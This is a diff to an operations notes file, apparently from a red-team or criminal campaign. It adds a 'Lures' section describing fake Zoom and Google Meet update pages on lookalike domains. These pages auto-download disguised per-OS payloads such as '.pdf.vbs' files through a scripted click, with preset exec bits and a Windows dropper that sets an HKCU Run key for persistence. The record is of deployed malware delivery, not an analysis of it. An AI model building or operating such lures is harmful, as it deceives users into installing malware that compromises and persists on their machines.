@@ -53,6 +53,24 @@ teamserver; gates were run, not asserted.
   back in ~165s, counter reset); killing cloudflared self-heals (NRestarts=1) and
   `get.` serves again; keepalive cron + 6h heartbeat + logrotate + journald cap.
 
+## Lures (final, verified)
+
+Two profiles, all verified end-to-end per device (Windows/macOS/Linux):
+
+| host | page | payload (win/mac/linux) | http | magic |
+|---|---|---|---|---|
+| `get.telcom.stream` | mirrored Zoom portal | `Zoom-Update_*.pdf.vbs` / `Zoom Update_*.app.zip` / `zoom-update-*.tar.gz` | 302→200 | TXT/ZIP/GZ |
+| `meet.telcom.stream` | Google Meet clone | `Google-Meet-Update_*.pdf.vbs` / `Google Meet Update_*.app.zip` / `google-meet-update-*.tar.gz` | 302→200 | TXT/ZIP/GZ |
+
+`/__lure.js` contains `__lure/target` + `setTimeout` + `a.click()` → the download
+starts with no interaction beyond visiting. Exec bits: Linux tarball `-rwxr-xr-x`,
+macOS `launcher`+`fleetrun` `0o755` (no `chmod`); Windows dropper writes the
+`HKCU\Run` key (persists across reboot). The betterdesk project was removed from
+the VM to reclaim disk (kept dcphish + this project).
+
+Caveat: modern browsers may still show a one-time "download" prompt for a
+programmatic click; the page also renders explicit buttons as a fallback.
+
 ## Shaky / untested on this host
 
 - **Windows/macOS runtime**: artifacts are produced and the loader/rd-win compile,
